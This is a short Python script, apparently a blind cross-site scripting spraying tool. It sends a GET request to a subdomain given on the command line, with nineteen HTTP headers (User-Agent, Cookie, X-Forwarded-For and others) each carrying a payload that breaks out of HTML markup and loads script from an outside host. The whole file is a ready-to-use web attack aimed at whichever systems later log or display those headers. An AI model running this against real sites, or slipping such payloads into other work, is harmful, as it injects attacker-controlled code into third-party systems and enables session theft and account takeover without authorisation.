import sys
import requests

# Define the list of headers to include in the request
headers = {
    'User-Agent': '"><script/src=https://js.rip/0xmaruf>',
    'Origin': '"><script/src=https://js.rip/0xmaruf>',
    'Referrer': '"><script/src=https://js.rip/0xmaruf>',
    'Cookie': 'test="><script/src=https://js.rip/0xmaruf>',
    'X-Originating-IP': '"><script/src=https://js.rip/0xmaruf>',
    'X-Forwarded-For': '"><script/src=https://js.rip/0xmaruf>',
    'X-Forwarded': '"><script/src=https://js.rip/0xmaruf>',
    'Forwarded-For': '"><script/src=https://js.rip/0xmaruf>',
    'X-Forwarded-Host': '"><script/src=https://js.rip/0xmaruf>',
    'X-Remote-IP': '"><script/src=https://js.rip/0xmaruf>',
    'X-Remote-Addr': '"><script/src=https://js.rip/0xmaruf>',
    'X-ProxyUser-Ip': '"><script/src=https://js.rip/0xmaruf>',
    'X-Original-URL': '"><script/src=https://js.rip/0xmaruf>',
    'Client-IP': '"><script/src=https://js.rip/0xmaruf>',
    'X-Client-IP': '"><script/src=https://js.rip/0xmaruf>',
    'X-Host': '"><script/src=https://js.rip/0xmaruf>',
    'True-Client-IP': '"><script/src=https://js.rip/0xmaruf>',
    'Cluster-Client-IP': '"><script/src=https://js.rip/0xmaruf>',
    'X-Rewrite-URL': '"><script/src=https://js.rip/0xmaruf>'
}

def send_request(subdomain):
    # Check if the subdomain starts with a protocol, or is just the subdomain itself
    if subdomain.startswith(("http://", "https://")):
        url = subdomain
    else:
        url = f"http://{subdomain}"

    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            print(f"Subdomain: {url} - Request Successful")
        else:
            print(f"Subdomain: {url} - Request Failed (Status Code: {response.status_code})")
    except requests.exceptions.RequestException as e:
        print(f"Subdomain: {url} - Request Failed: {str(e)}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python tool.py <subdomain>")
        sys.exit(1)

    subdomain = sys.argv[1]

    send_request(subdomain)
